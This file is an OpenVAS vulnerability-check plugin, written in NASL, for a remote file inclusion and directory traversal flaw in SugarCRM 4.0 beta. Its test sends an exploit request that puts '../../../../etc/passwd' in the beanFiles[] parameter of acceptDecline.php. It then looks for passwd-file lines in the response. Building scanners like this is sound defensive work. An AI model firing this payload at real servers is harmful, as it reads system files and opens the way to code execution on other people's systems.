# OpenVAS Vulnerability Test
# $Id: sugarcrm_remote_file_inclusion.nasl 17 2013-10-27 14:01:43Z jan $
# Description: SugarCRM <= 4.0 beta Remote File Inclusion Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2005 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that is prone to 
multiple flaws.

Description :

SugarCRM is a Customer Relationship Manager written in PHP.

The version of SugarCRM installed on the remote host
does not properly sanitize user input
in the 'beanFiles[]' parameter in the 'acceptDecline.php' 
file. A attacker can use this flaw to display sensitive 
information and to include malicious code wich can be used 
to execute arbitrary commands. 

This vulnerability exists if 'register_globals' is enabled.";

tag_solution = "Upgrade to Sugar Suite version 3.5.1e and/or disable PHP's 
'register_globals' setting.";

if (description) {
script_id(20286);
script_version("$Revision: 17 $");
script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

script_cve_id("CVE-2005-4087",
              "CVE-2005-4086");
script_bugtraq_id(15760);

name = "SugarCRM <= 4.0 beta Remote File Inclusion Vulnerability";
script_name(name);

desc = "
Summary:
" + tag_summary + "
Solution:
" + tag_solution;script_description(desc);

summary = "Check if SugarCRM is vulnerable to Directory Traversal and Remote File Inclusion";
script_summary(summary);

script_category(ACT_ATTACK);
script_family("Web application abuses");

script_copyright("This script is Copyright (C) 2005 Ferdy Riphagen");

script_dependencies("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
}
script_xref(name : "URL" , value : "http://retrogod.altervista.org/sugar_suite_40beta.html");
script_xref(name : "URL" , value : "http://marc.theaimsgroup.com/?l=bugtraq&amp;m=113397762406598&amp;w=2");
exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/sugarsuite", "/sugarcrm", "/crm", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{ 
  string[0] = "../../../../../../../../etc/passwd";
  if ( thorough_tests )
	{
  	string[1] = string("http://", get_host_name(), "/robots.txt");
	pat =  "root:.*:0:[01]:.*:|User-agent:";
	}
   else
	pat = "root:.*:0:[01]:.*:";
 
  for(exp = 0; string[exp]; exp++)
  {
   req = http_get(item:string(dir, "/acceptDecline.php?beanFiles[1]=", string[exp], "&beanList[1]=1&module=1"), port:port);
   recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if(recv == NULL)exit(0);
   
   if( egrep(pattern: pat, string:recv))
   {
    security_hole(port);
    exit(0);
   }
  }
}
